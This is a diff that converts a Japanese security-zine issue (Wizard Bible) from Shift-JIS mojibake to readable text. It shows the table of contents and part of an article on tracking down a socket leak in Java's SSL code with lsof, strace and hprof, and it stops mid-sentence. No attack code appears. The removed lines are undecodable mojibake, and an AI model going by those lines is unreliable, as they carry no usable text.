@@ -8,84 +8,84 @@
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-  ---- ��0�́F�ڎ� ---
+  ---- 第0章：目次 ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-����1��: �}�j�A�b�NJava�v���O���~���O��8��: �` �f�o�b�M���OJava �` ���� ��
+○第1章: マニアックJavaプログラミング第8回: 〜 デバッギングJava 〜 金床 著
 
-����2��: Perfect Dark Kracking                                     Will ��
+○第2章: Perfect Dark Kracking                                     Will 著
 
-����3��: �V�����U�����ނ̂���                                  ������ ��
+○第3章: 新聞勧誘員撃退のお呪い                                  理事長 著
 
-����4��: �͂��߂Ẵn�b�L���O�@�`�t�H�[�}�b�g�X�g�����O�U��2�`  Defolos ��
+○第4章: はじめてのハッキング　〜フォーマットストリング攻撃2〜  Defolos 著
 
-����5��: �t�A�Z���u���R�[�h��ǂ�ł݂悤                    Kenji Aiko ��
+○第5章: 逆アセンブルコードを読んでみよう                    Kenji Aiko 著
 
-����6��: ��b�Í��w�u���E��17�� �`Rabin�Í��`                  IPUSIRON ��
+○第6章: 基礎暗号学講座・第17回 〜Rabin暗号〜                  IPUSIRON 著
 
-����7��: ���m�点
+○第7章: お知らせ
 
-����8��: ���҃v���t�B�[��
+○第8章: 著者プロフィール
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��1��: �}�j�A�b�NJava�v���O���~���O��8��: �` �f�o�b�M���OJava �` ---
+--- 第1章: マニアックJavaプログラミング第8回: 〜 デバッギングJava 〜 ---
 
-���ҁF����
+著者：金床
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �͂��߂�
+■0x01.) はじめに
 
-�@�߳���܁B�����Linux���ł�Java�f�o�b�O�ɂ��āA���ۂɂ��������}�j�A
-�b�N�ȃo�O���ނɉ���������Ȃ��B���̃o�O��Java��Sauce�R�[�h�ɐ���ł���A
-2�����납��7���܂ŕM�҂�Y�܂������Ă��������Ȃ��̂ł���B���̃o�O�͂���
-��ɂ��}�j�A�b�N�����ĕ��ʂ̐l�͑������邱�Ƃ��Ȃ����Ǝv�����A�f�o�b�O��
-�@���̂��̂͑��̃o�O�Ԃ����͂Ȃǂɂ����p���������̂ł���B
-
-
-��0x02.) SSL Main in the middle�Ŕ���
-
-�@�M�҂͈ȑO���AWizard Bible Vol.15�ŏЉ���悤��SSL��Man in the middle
-���s���v���L�V�T�[�o�[���������iDoorman@JUMPERZ.NET��Guardian@JUMPERZ.NET
-�Ȃǁj�J�����Ă���̂����A�ǂ���Linux����Java1.5��1.6�ł̂ݓ��삪������
-���̂ł���i1.4�n��ł͑��v�j�B��̓I�ɂ́A�e�X�g�ő�ʂ̒ʐM�𔭐�����
-�Ă���ƁAtoo many open files�Ƃ����G���[���o�n�߁A���������v���L�V�T�[
-�o�[�Ƃ��ē��삷�邱�Ƃ��ł��Ȃ��Ȃ��Ă��܂��A�Ƃ������̂��B
-
-�@too many open files�Ƃ����āu�����A�A�����c�v�Ǝv�����ǎ҂����邾�낤�B
-Linux�ł�1�̃v���Z�X���J�����Ƃ̂ł���t�@�C���f�B�X�N���v�^�iWindows��
-�̓n���h���ƌĂ΂��T�O�j�̍ő吔�����܂��Ă���A�f�t�H���g�ł�1024�Ȃ�
-�̒l���p������B���̒l�̓J�[�l���̃w�b�_�t�@�C���̏���������V�F���̃r
-���g�C���R�}���h�ł���ulimit�ȂǂŕύX���邱�Ƃ��ł���B
-
-�@���Ă��t�@�C���f�B�X�N���v�^�Ƃ��Ĉ����邽�߁A�l�b�g���[�N�T�[�o�[��
-���̃G���[�𔭐������Ă��܂��ꍇ�Ϳ��Ă��m�ۂł��Ȃ����߂Ɏ����㻰�޽����
-�~���Ă��܂����ƂɂȂ�A�ً}���Ԃƌ�����B�M�҂�����Ă����T�[�o�[�͂���
-�G���[�̂��߂ɂ��鎞�_�Ŏg�����ɂȂ�Ȃ��Ȃ��Ă��܂����߁A�u�����Ԉ����
-��������v�Ƃ����ڕW���B���ł��������Ă����B
+　ポウンニチワ。今回はLinux環境でのJavaデバッグについて、実際にあった超マニア
+ックなバグを題材に解説をおこなう。このバグはJavaのSauceコードに潜んでおり、
+2月ごろから7月まで筆者を悩ませ続けていた凶悪なものである。このバグはあま
+りにもマニアックすぎて普通の人は遭遇することもないかと思うが、デバッグ手
+法そのものは他のバグつぶしや解析などにも応用がきくものである。
 
 
-��0x03.) �t�@�C���f�B�X�N���v�^�𒲂ׂ�
+■0x02.) SSL Main in the middleで発生
 
-�@����Ȃ킯�Ńf�o�b�O���n�܂����B�܂��ŏ��Ɂu���܂��܁A�ꎞ�I�ɂ�������
-�̃t�@�C���f�B�X�N���v�^���g���Ă��邾���ł���v�Ƃ������Ȃ��]��������
-�����𗧂ĂĂ݂��B���̏ꍇ�A�ꎞ�I�Ɏg�p���Ă���t�@�C���f�B�X�N���v�^��
-������1024�𒴂��Ă��邾���Ƃ������ƂɂȂ�̂ŁA���̐��ɗ]�T���������Ă�
-��΂����B��̓I�ɂ�ulimit -n 100000�ȂǂƂ���΁A10�����̃t�@�C���f�B�X
-�N���v�^�������邱�ƂɂȂ�i���ɂ���Ă�ulimit�����łȂ�/etc/security/
-limits.conf�̐ݒ�ⶰ�ق̍�蒼�����K�v�ȃP�[�X������悤�Ȃ̂ŗv���Ӂj�B
-���������ʂ͎c�O�Ȃ���A�T�[�o�[�����ʂ܂ł̎��Ԃ����������邾���ł������B
+　筆者は以前より、Wizard Bible Vol.15で紹介したようなSSLのMan in the middle
+を行うプロキシサーバーをいくつか（Doorman@JUMPERZ.NETやGuardian@JUMPERZ.NET
+など）開発しているのだが、どうもLinux環境のJava1.5や1.6でのみ動作がおかし
+いのである（1.4系列では大丈夫）。具体的には、テストで大量の通信を発生させ
+ていると、too many open filesというエラーが出始め、それっきりプロキシサー
+バーとして動作することができなくなってしまう、というものだ。
 
-�@���̂��ߍ��x��lsof�R�}���h�ɂ���Ď��ۂɃv���Z�X���g�p���Ă���t�@�C��
-�f�B�X�N���v�^�̈ꗗ���o�͂��Ă݂邱�Ƃɂ����B����Ǝ��̂悤�Ȋ�ȍs��
-��ʂɁi1000�s���炢�j�o�͂��ꂽ�B
+　too many open filesときいて「ああ、アレか…」と思った読者もいるだろう。
+Linuxでは1つのプロセスが開くことのできるファイルディスクリプタ（Windowsで
+はハンドルと呼ばれる概念）の最大数が決まっており、デフォルトでは1024など
+の値が用いられる。この値はカーネルのヘッダファイルの書き換えやシェルのビ
+ルトインコマンドであるulimitなどで変更することができる。
+
+　ソケットもファイルディスクリプタとして扱われるため、ネットワークサーバーが
+このエラーを発生させてしまう場合はソケットが確保できないために事実上サービスが停
+止してしまうことになり、緊急事態と言える。筆者が作っていたサーバーはこの
+エラーのためにある時点で使い物にならなくなってしまうため、「長時間安定稼
+働させる」という目標が達成できず困っていた。
+
+
+■0x03.) ファイルディスクリプタを調べる
+
+　そんなわけでデバッグが始まった。まず最初に「たまたま、一時的にたくさん
+のファイルディスクリプタを使っているだけである」というかなり願望が入った
+仮説を立ててみた。この場合、一時的に使用しているファイルディスクリプタの
+総数が1024を超えているだけということになるので、この数に余裕を持たせてや
+ればいい。具体的にはulimit -n 100000などとすれば、10万ものファイルディス
+クリプタを扱えることになる（環境によってはulimitだけでなく/etc/security/
+limits.confの設定やカーネルの作り直しが必要なケースもあるようなので要注意）。
+しかし結果は残念ながら、サーバーが死ぬまでの時間が長くかかるだけであった。
+
+　そのため今度はlsofコマンドによって実際にプロセスが使用しているファイル
+ディスクリプタの一覧を出力してみることにした。すると次のような奇妙な行が
+大量に（1000行くらい）出力された。
 
 -----
 java    1919 root  884u  sock    0,5            10398 can't identify protocol
@@ -101,16 +101,16 @@ java    1919 root  894u  sock    0,5            10447 can't identify protocol
 java    1919 root  895u  sock    0,5            10448 can't identify protocol
 -----
 
-�@�Ȃ�Ƃ������������ŁA�u���[�N���Ă���̂́i�t�@�C���ł͂Ȃ��j���Ăł�
-��v�u���̿��Ă�ذ����Ă���v���x�̏�񂵂��ǂ݂Ƃ邱�Ƃ��ł��Ȃ��Bذ�
-���鿹�Ă̐��͈�肹���A�܂��N���サ�΂炭�͐���Ȃ̂����A����Ƃ�����ذ
-�����������ȂǁA�Ȃ��Ȃ�ذ��̋��������肵�Ă��Ȃ��B
+　なんとも激しく微妙で、「リークしているのは（ファイルではなく）ソケットであ
+る」「何個のソケットがリークしている」程度の情報しか読みとることができない。リーク
+するソケットの数は一定せず、また起動後しばらくは正常なのだが、あるときからリー
+クが発生するなど、なかなかリークの挙動が安定していない。
 
-�@�����łƂ肠���������̃R�[�h���ēx�������A���Čn�̃��\�[�X���[�N������
-���ǂ������X�܂Ō������Ă݂��B���������ʂ̓i�V�B�ŏI�I�ɂ��̃o�O��������
-����ɏ����ȃR�[�h�ɂ܂ŗ��Ƃ�����ł݂āA���̃��[�N�������̂����ł͂�
-���AJava���ł���Ƃ����m�M�������ƂɂȂ����B���̃o�O���Č��\�ȃ\�[�X
-�͈ȉ��̂悤�Ȃ��̂��B
+　そこでとりあえず自分のコードを再度見直し、ソケット系のリソースリークが無い
+かどうか隅々まで検討してみた。しかし結果はナシ。最終的にこのバグが発生す
+る非常に小さなコードにまで落とし込んでみて、このリークが自分のせいではな
+く、Java側であるという確信を持つことになった。このバグが再現可能なソース
+は以下のようなものだ。
 
 -----
 import java.net.*;
@@ -146,59 +146,59 @@ socket2.close();
 }
 -----
 
-�@SSLSocketFactory���g�����߁A�N�����ɂ�.keystore�t�@�C����p�ӂ���K�v��
-����B�N���͎��̂悤�ȃR�}���h�ōs���i�p�X���[�h�͉���changeit�Ƃ���j�B
+　SSLSocketFactoryを使うため、起動時には.keystoreファイルを用意する必要が
+ある。起動は次のようなコマンドで行う（パスワードは仮にchangeitとする）。
 
 -----
 java -Djavax.net.ssl.keyStore=.keystore -Djavax.net.ssl.keyStorePassword=changeit test1
 -----
 
-�@���̃o�O��ǂ������邽�߁A���̒i�K�܂łɔ��ɑ����̎��Ԃ��₵�Ă���
-�����B�����������̃R�[�h�̏C���ł͑Ή��ł��Ȃ������ł���B�������N������
-���o�O�̒��ł��A���Ȃ��������Ȃ��̂ɂȂ�\�������Ă����B
+　このバグを追いかけるため、この段階までに非常に多くの時間を費やしてしま
+った。しかも自分のコードの修正では対応できなさそうである。ここ数年遭遇し
+たバグの中でも、かなりやっかいなものになる予感がしていた。
 
 
-��0x04.) �V�X�e���R�[�����g���[�X����
+■0x04.) システムコールをトレースする
 
-�@�Č�����R�[�h���쐬���邱�Ƃ��ł����̂ŁA2008�N2������Sun(http://bugs
-.sun.com/)�ɕ񍐂��Ă݂��̂����A�܂�����艹�������Ȃ��B�ォ��킩������
-�Ƃ����A�ǂ���OpenJDK���̂��������ȂǂŁAJava�ɂ��Ẵo�O�񍐐悪http:
-//bugs.sun.com/���烁�[�����O���X�g����̂Ƃ���̐��Ɉڍs���Ă����悤�ł�
-��B�Ⴆ��SSL�֘A�̃��[�����O���X�g��http://mail.openjdk.java.net/mailman
-/listinfo/security-dev�ƂȂ�B
+　再現するコードを作成することができたので、2008年2月頃にSun(http://bugs
+.sun.com/)に報告してみたのだが、まるっきり音沙汰がない。後からわかったこ
+とだが、どうもOpenJDK化のごたごたなどで、Javaについてのバグ報告先がhttp:
+//bugs.sun.com/からメーリングリストを主体とする体制に移行していたようであ
+る。例えばSSL関連のメーリングリストはhttp://mail.openjdk.java.net/mailman
+/listinfo/security-devとなる。
 
-�@Sun����܂������������Ȃ����߂��̃o�O�ɂ��Ă͂��΂炭���u���Ă����̂�
-���A����Ƃ��ʂ̃l�^�iVMware�n�j�������������Ă���Ƃ��ɁAstrace�Ƃ�����
-�֗��ȃR�}���h��m���Ă��܂����B�����Linux��ŃV�X�e���R�[�������O�Ɏ��
-���Ƃ��ł���c�[���ŁACentOS�Ȃ��yum install strace�ŃC���X�R���邱�Ƃ�
-�ł���B�Ⴆ��ls�R�}���h�̓���𒲂ׂ�ɂ�
+　Sunからまったく反応がないためこのバグについてはしばらく放置していたのだ
+が、あるとき別のネタ（VMware系）をごそごそしているときに、straceという超
+便利なコマンドを知ってしまった。これはLinux上でシステムコールをログに取る
+ことができるツールで、CentOSならばyum install straceでインスコすることが
+できる。例えばlsコマンドの動作を調べるには
 
 -----
 strace ls
 -----
 
-�@�Ƃ��邾�����B�܂��Ԃ����Ⴏ�u���܂Œm��Ȃ������̂���شŽ�v���قŕK�{
-����ނł���strace�B�t�b�N�n�ɂ��Ă͓�������肵�Ă��Ă��Ȃ�ǂ��������B��
-�肠�������[�N���Ă���socket�֌W�̊֐��ł����Ă݂邩�A�Ƃ�������ł���
-test1�N���X�ɂ��Ă�strace���Ă݂邱�Ƃɂ����B
+　とするだけだ。まぁぶっちゃけ「今まで知らなかったのかよアリエナス」レベルで必須
+コマンドであるstrace。フック系にしては動作も安定していてかなり良い感じだ。と
+りあえずリークしているsocket関係の関数でも見てみるか、というつもりでこの
+test1クラスについてもstraceしてみることにした。
 
-�@Java�̃A�v���P�[�V�����̓f�t�H���g�Ń}���`�X���b�h�Ȃ̂Łi���Ƃ���gc��
-�s���X���b�h�Ȃǂ��Ɨ����Ă���j�Astrace�ł��ꂢ�Ƀ��O�����ɂ�-o�I�v�V
-������-ff�I�v�V������g�ݍ��킹��Ƃ��������ł���B
+　Javaのアプリケーションはデフォルトでマルチスレッドなので（たとえばgcを
+行うスレッドなどが独立している）、straceできれいにログを取るには-oオプシ
+ョンと-ffオプションを組み合わせるといい感じである。
 
 -----
 strace -o log -ff java -Djavax.net.ssl.keyStore=.keystore -Djavax.net.ssl.keyStorePassword=changeit test1
 -----
 
-�@���̂悤�ɂ���ƁA���ꂼ��̃X���b�h�ɂ��āuPID.log�v�Ƃ����������̃�
-�O�t�@�C�������������B
+　このようにすると、それぞれのスレッドについて「PID.log」といった感じのロ
+グファイルが生成される。
 
 
-��0x05.) ���₵���ӏ�ʯ��
+■0x05.) あやしい箇所ハッケソ
 
-�@�����������ꂽ�ڰ�۸�̧�ق�grep -li socket���Ă݂�ƁA2��̧�ق������q
-�b�g����B�Е���Java�A�v���P�[�V�����̃��C���̃X���b�h�ŁA�Е��͂��܂���
-�悭�킩��Ȃ����̂��B�����Č�҂̃t�@�C���ɔ��ɂ��₵���ӏ��𔭌������B
+　複数生成されたトレースログファイルをgrep -li socketしてみると、2つのファイルだけがヒ
+ットする。片方はJavaアプリケーションのメインのスレッドで、片方はいまいち
+よくわからないものだ。そして後者のファイルに非常にあやしい箇所を発見した。
 
 -----
 13:43:13.511753 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 15
@@ -219,35 +219,35 @@ strace -o log -ff java -Djavax.net.ssl.keyStore=.keystore -Djavax.net.ssl.keySto
 13:43:13.512853 rt_sigreturn(0x2aaaab551544)
 -----
 
-�@���̂悤�ȃ��O�����񂦂�Ƒ����Ă���̂��B�uSegmentation fault�v���Ă�
-�������ˁH�ς���ˁH�Ƃ��������ł���B�����Č���I�Ȃ��ƂɁA����Segmenta
-tion fault�̐����Alsof�Œ��ׂ邱�Ƃ��ł���A�u���[�N���Ă��鿹�Ă̐��v��
-��v�����̂ł���B���������邼(`�D�L)�m��ק!!!
+　このようなログがえんえんと続いているのだ。「Segmentation fault」ってお
+かしくね？変じゃね？という感じである。そして決定的なことに、このSegmenta
+tion faultの数が、lsofで調べることができる、「リークしているソケットの数」と
+一致したのである。怪しすぎるぞ(`Д´)ノゴラァ!!!
 
-�@������Segmentation fault���N�����Ă���̂���۾��������Ȃ��Ƃ����̂��s�v
-�c�ł���B�V�O�i�����g���b�v���Ă���̂��낤���B���̃t�@�C����2�s�ڂɂ���
+　しかしSegmentation faultが起こっているのにプロセスが落ちないというのが不思
+議である。シグナルをトラップしているのだろうか。このファイルの2行目にある
 
 -----
 13:43:12.655353 rt_sigprocmask(SIG_UNBLOCK, [ILL BUS FPE SEGV USR2], NULL, 8) = 0
 -----
 
-�@�Ƃ����s���җ�Ɋ֌W���肻�������悭�킩��Ȃ��i�N�������Ă��������j�B
+　という行が猛烈に関係ありそうだがよくわからない（誰か教えてくだちい）。
 
 
-��0x06.) Null��ʯ��
+■0x06.) Nullポハッケソ
 
-�@���ē��삵�����Ă���A�v���P�[�V����������Segmentation fault����������
-����Ƃ����ُ펖�ԂȂ̂ŁA���߂�Java�A�v���f�o�b�O�̊�{�ɕԂ�A-Xrunhpr
-of�I�v�V�����Ŋ֐��̃g���[�X�����Ă݂邱�Ƃɂ����B�ŋߒm�������Ƃ����A-X
-runhprof�I�v�V�������g���ꍇ�ɂ͎��̂悤��depth�I�v�V�������w�肷��Ɣ��
-�ɕ֗��ł���B
+　さて動作し続けているアプリケーション内部でSegmentation faultが発生して
+いるという異常事態なので、改めてJavaアプリデバッグの基本に返り、-Xrunhpr
+ofオプションで関数のトレースを見てみることにした。最近知ったことだが、-X
+runhprofオプションを使う場合には次のようにdepthオプションを指定すると非常
+に便利である。
 
 -----
 java -Xrunhprof:thread=y,depth=50 test
 -----
 
-�@depth�̐��́u���K�w�܂Ńg���[�X���邩�v�����߂�B�Ⴆ��depth=3�ɂ���ƁA
-�_���v�����o�͎͂��̂悤�ɒZ�����̂ɂȂ�B
+　depthの数は「何階層までトレースするか」を決める。例えばdepth=3にすると、
+ダンプされる出力は次のように短いものになる。
 
 -----
 TRACE 300013: (thread=200001)
@@ -264,7 +264,7 @@ TRACE 300015: (thread=200001)
         java.nio.HeapCharBuffer.<init>(HeapCharBuffer.java:52)
 -----
 
-�@�����傫�Ȑ��i�Ⴆ��50�j�ɂ���Ǝ��̂悤�ɂȂ�B
+　これを大きな数（例えば50）にすると次のようになる。
 
 -----
 TRACE 300014: (thread=200001)
@@ -293,14 +293,14 @@ TRACE 300016: (thread=200001)
         java.lang.String.<init>(String.java:516)
 -----
 
-�@50�Ƃ����̂́u�ő��50�K�w�v�Ƃ����Ӗ��Ȃ̂ŁA���̂悤�ɕ��ʂ̃g���[�X
-�͂��ׂďo�͂���邱�ƂɂȂ�B�֐��̌Ăяo�������ɐ[���A�v���P�[�V����
-�̏ꍇ�Ȃǂɂ�100��200�Ȃǂ̐��l���w�肷��΂悢�Bdepth�̃f�t�H���g�l��4
-�ł��邪�A����͏���������C������B
+　50というのは「最大で50階層」という意味なので、このように普通のトレース
+はすべて出力されることになる。関数の呼び出しが非常に深いアプリケーション
+の場合などには100や200などの数値を指定すればよい。depthのデフォルト値は4
+であるが、これは小さすぎる気がする。
 
-�@���Ă��̂悤�ɂ��čēxtest1��Java�ڰ������A�����Segmentation fault��
-�N�����Ă���Ƃ̂��Ƃŗ�O�iException�j��ܰ�ނɌ������Ă����Ƃ���A����
-�ڰ����������B
+　さてこのようにして再度test1のJavaトレースを取り、さらにSegmentation faultが
+起こっているとのことで例外（Exception）をキーワードに検索していたところ、次の
+トレースを見つけた。
 
 -----
 TRACE 307528: (thread=200004)
@@ -323,34 +323,34 @@ TRACE 307528: (thread=200004)
         java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:178)
 -----
 
-�@�Ȃ��Null�߂��A������SSLSocket�̓����Ŕ������Ă���ł͂Ȃ����B�܂��A�
-ڰ���į�߂������Finalizer�Ƃ�����ܰ�ނ�����A���ꂪGC�X���b�h�ɂ���Ĉ�
-���N������Ă��邱�Ƃ��킩��Bstrace�ɂ����Segmentation fault����������
-�Ă����X���b�h�́A���C���X���b�h�ł͂Ȃ�GC�X���b�h�������̂ł���B
+　なんとNullポが、しかもSSLSocketの内部で発生しているではないか。また、ト
+レースのトップを見るとFinalizerというキーワードがあり、これがGCスレッドによって引
+き起こされていることがわかる。straceによってSegmentation faultが発見され
+ていたスレッドは、メインスレッドではなくGCスレッドだったのである。
 
-�@̧���ި����������邽�߂̺��ނ̓r����NULL�߂��������Ă��邽�߁Aذ���
-��������B�����GC�گ�ނƂ����̂͏����̓r���ŗ�O���������Ă���������Ƃ�
-���d�l�Ȃ̂ŁA���ع���݂͓���𑱂��Ă��܂��B
+　ファイルディスクリプタを閉じるためのコードの途中でNULLポが発生しているため、リークが
+発生する。一方でGCスレッドというのは処理の途中で例外が発生しても無視するとい
+う仕様なので、アプリケーションは動作を続けてしまう。
 
-�@GC�����������邩�͂��̎��X�ňقȂ邽�߁A���[�N����������^�C�~���O��
-�ǂ����肵�Ă��Ȃ��������Ƃɂ��[�����������B
+　GCがいつ発生するかはその時々で異なるため、リークが発生するタイミングな
+どが安定していなかったことにも納得がいった。
 
 
-��0x07.) Java�̿�����ނ�ǂ�
+■0x07.) Javaのソースコードを読む
 
-�@���ĉ������ӏ��iOutputRecord.java��314�s�ڂ�����j���킩�����̂ŁA����
-��ނ�ǂ�ł݂邱�Ƃɂ���B�M�҂��ȑO�޳�۰�ނ���Java�̿���ɂ͗A�o������
-�֌W���炩SSL�܂��̸׽���܂܂�Ă��Ȃ������̂����A����OpenJDK�̻�Ă���
-�޳�۰�ނł��鿰��ɂ�SSL�܂��̸׽�����ׂĊ܂܂�Ă���i�f���炵���I�j�B
+　さて怪しい箇所（OutputRecord.javaの314行目あたり）がわかったので、ソースコ
+ードを読んでみることにする。筆者が以前ダウンロードしたJavaのソースには輸出制限の
+関係からかSSLまわりのクラスが含まれていなかったのだが、現在OpenJDKのサイトから
+ダウンロードできるソースにはSSLまわりのクラスもすべて含まれている（素晴らしい！）。
 
-�@�M�҂Ϳ�����ނ�ǂނƂ���printf�f�o�b�O���Ȃ���łȂ��Ɠǂ߂Ȃ��l�ł���
-�̂ŁA���łɏ����撣����OpenJDK���r���h������𐮂��Ă݂��BCentOS5��
-�������̃��C�u�������C���X�g�[�����A�܂�OpenJDK�̃h�L�������g�ɂ���悤
-�ɂ������̊��ϐ��Ȃǂ�ݒ肷�邱�ƂŁA�茳��Linux���JDK���r���h�ł�
-��悤�ɂȂ�B�M�҂͂��̂悤�ȃC���X�g�[����Ƃ����Ȃ̂����A����͉^��
-�������قǂŖ����Ƀr���h���𐮂��邱�Ƃ��ł����B
+　筆者はソースコードを読むときにprintfデバッグしながらでないと読めない人である
+ので、ついでに少し頑張ってOpenJDKをビルドする環境を整えてみた。CentOS5に
+いくつかのライブラリをインストールし、またOpenJDKのドキュメントにあるよう
+にいくつかの環境変数などを設定することで、手元のLinux上でJDKがビルドでき
+るようになる。筆者はこのようなインストール作業が苦手なのだが、今回は運良
+く半日ほどで無事にビルド環境を整えることができた。
 
-�@Null�߂��������Ă���ӏ��́A�ȉ��̺��ނ������B
+　Nullポが発生している箇所は、以下のコードだった。
 
 -----
     void writeBuffer(OutputStream s, byte [] buf, int off, int len)
@@ -359,8 +359,8 @@ TRACE 307528: (thread=200004)
         s.flush();
 -----
 
-�@s��NULL�̏�Ԃł��̊֐��iwriteBuffer�j���Ăяo����Ă���̂ł���B����
-�ŁA�M�҂͎��̂悤���߯����쐬�����B
+　sがNULLの状態でこの関数（writeBuffer）が呼び出されているのである。そこ
+で、筆者は次のようなパッチを作成した。
 
 -----
 *** src/share/classes/sun/security/ssl/OutputRecord_orig.java   2008-07-09 01:54:02.000000000 +0900
@@ -376,62 +376,62 @@ TRACE 307528: (thread=200004)
           s.flush();
 -----
 
-�@�us��NULL��������return����v�Ƃ����A�܂��ɕt���Ă��n�B���߰ʶ����^���A
-�߯������߯��ł���B�ǂ����s���Ă��鏈����GC�̒��ł̿��Ă̸۰�ޏ����Ȃ̂ŁA
-���������K���ł������񂶂�ˁH�Ƃ����̂ƁA�Ƃɂ���ذ����Ȃ��悤�ɂ�������
-���̂ł��̂悤���߯����쐬�����B
-�@������m�F���Ă݂��Ƃ���A����ذ������܂��Ă���B�Ђǂ��޸ނ������̂ŁA
-�����߯��ɂ����ذ������܂邱�Ƃ��m�F�����ۂͶޯ��߰�ނ���яo�����B
+　「sがNULLだったらreturnする」という、まさに付け焼き刃。スーパーハカーも真っ青、
+パッチ中のパッチである。どうせ行っている処理はGCの中でのソケットのクローズ処理なので、
+けっこう適当でもいいんじゃね？というのと、とにかくリークしないようにしたかっ
+たのでこのようなパッチを作成した。
+　動作を確認してみたところ、無事リークが収まっている。ひどいバグだったので、
+このパッチによってリークが収まることを確認した際はガッツポーズが飛び出した。
 
 
-��0x08.) ��������
+■0x08.) 原因究明
 
-�@���Ă��́u�߯���������ׂ��v�Ƃ����߯������[�����OؽĂɓ��e�����Ƃ���A
-��͂���҂�����H������B�Ȃ�NULL�ɂȂ�̂��������ׂ����A�Ƃ������Ƃł���B
-���_�����ĸީ�̉����o�܂���B�Ƃ������ƂŁASSL�̏����͂�₱�������Ȃ̂�
-���Ԃ�킩��Ȃ����낤�ȁA�Ǝv���¿��������Ɍ��Ă������Ƃɂ����B
+　さてこの「パッチかくあるべし」というパッチをメーリングリストに投稿したところ、
+やはりダメだしを食らった。なぜNULLになるのかチェックすべきだ、ということである。
+正論すぎてグゥの音も出ません。ということで、SSLの処理はややこしそうなので
+たぶんわからないだろうな、と思いつつソースをさらに見ていくことにした。
 
-�@�ڰ���ǂ��Ă݂�ƁAwriteBuffer��NULL�ɂȂ��Ă���OutputStream��s��SSLS
-ocketImpl��sockOutput�ł��邱�Ƃ��킩��B��肪�N����ӏ��̂ЂƂł���S
-SLSocketImpl�׽��closeInternal��print���𖄂ߍ��݁AsockOutput���o�͂�����
-�݂�ƁA��͂�NULL�ƂȂ��Ă���BSSLSocketImpl�׽�ɂ͔��ɏd�v�ȓ����iSS
-L�̏�Ԃ̊Ǘ��j���s���Ǝv����connectionState�Ƃ����ϐ������݂��邽�߁A
-���̕ϐ��������ɒǂ��Ă݂��B���ߍ���print���͎��̂悤�Ȃ��̂��B
+　トレースを追ってみると、writeBufferでNULLになっているOutputStreamのsはSSLS
+ocketImplのsockOutputであることがわかる。問題が起こる箇所のひとつであるS
+SLSocketImplクラスのcloseInternalにprint文を埋め込み、sockOutputを出力させて
+みると、やはりNULLとなっている。SSLSocketImplクラスには非常に重要な働き（SS
+Lの状態の管理）を行うと思われるconnectionStateという変数が存在するため、
+この変数も同時に追ってみた。埋め込んだprint文は次のようなものだ。
 
 -----
 System.out.println( this + " " + connectionState + " " + sockOutput + " " + isConnected() + " " + isClosed() );
 -----
 
-�@connectionState�Ͳݽ�ݽ���쐬���ꂽ�Ƃ��ɂ�cs_START�i�l��0�j�Ȃ̂����A
-ذ����N�������_�ł�cs_HANDSHAKE�i�l��1�j�ɂȂ��Ă��邱�Ƃ��킩�����B����
-��connectionState�����������Ă���ӏ���T���Ă݂�ƁAinitHandshaker�Ƃ���
-�֐��̒��Ɏ��̂悤�ȉӏ��𔭌������B
+　connectionStateはインスタンスが作成されたときにはcs_START（値は0）なのだが、
+リークを起こす時点ではcs_HANDSHAKE（値は1）になっていることがわかった。そこ
+でconnectionStateを書き換えている箇所を探してみると、initHandshakerという
+関数の中に次のような箇所を発見した。
 
 -----
         if (connectionState == cs_START) {
             connectionState = cs_HANDSHAKE;
 -----
 
-�@�����ł����initHandshaker�ɂ������悤��print�����d����ł݂�ƁAsockO
-utput��NULL�̏ꍇ�Ƃ����łȂ��ꍇ�����邱�Ƃ��킩�����B�����Œm�肽���̂�
-sockOutput��NULL�̏ꍇ��initHandshaker���ǂ�����Ăяo����Ă���̂��H��
-�������Ƃł���B�P����print���̖��ߍ��݂ł́A���ނ��ǂ�����Ăяo����Ă�
-��̂��͂킩��Ȃ��B�����ŁA��O�̽����ڰ����g�����Ƃɂ����B
+　そこでさらにinitHandshakerにも同じようなprint文を仕込んでみると、sockO
+utputがNULLの場合とそうでない場合があることがわかった。ここで知りたいのは
+sockOutputがNULLの場合にinitHandshakerがどこから呼び出されているのか？と
+いうことである。単純なprint文の埋め込みでは、コードがどこから呼び出されてい
+るのかはわからない。そこで、例外のスタックトレースを使うことにした。
 
 -----
     ( new Exception() ).printStackTrace();
         System.out.println( this + ">>> " + getConnectionState() + " " + sockOutput + " " + isConnected() + " " + isClosed() );
 -----
 
-�@���̂悤�Ⱥ��ނ𖄂ߍ��ނƁA��O���������A�����ɽ����ڰ����װ�o�͂ɓf��
-�o�����B���̂��ߺ��ނ�������ʂ邽�тɁu�ǂ̊֐�����Ăяo����Ă����
-���v�����ׂĂ��ǂ邱�Ƃ��ł��A�������֗��ł���Bprintf���ޯ�ް��Java����
-����ۂɂ͕K�{�̃e�N�j�b�N�ƌ����邾�낤�B
+　このようなコードを埋め込むと、例外が発生し、同時にスタックトレースがエラー出力に吐き
+出される。このためコードがここを通るたびに「どの関数から呼び出されているの
+か」をすべてたどることができ、激しく便利である。printfデバッガーがJavaをい
+じる際には必須のテクニックと言えるだろう。
 
-�@����stackTrace�f�o�b�O�ɂ��A�����Ɍ������𖾂��ꂽ�B�Ȃ��SSLSocketI
